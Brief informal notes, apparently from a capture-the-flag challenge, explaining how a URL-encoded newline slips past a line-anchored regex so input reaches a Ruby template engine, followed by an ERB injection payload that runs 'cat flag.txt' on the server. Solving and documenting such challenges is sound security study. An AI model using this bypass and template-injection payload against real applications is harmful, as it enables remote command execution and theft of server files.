### N o T e S 

---

```py
%0a%01 allows you to bypass the rest of the regex, since the last char $ says to check until the end of the line

it all gets sent to an EBF which lets u run arbitrary ruby code

so 
%0a%01 <%= \`cat flag.txt\` %>
```
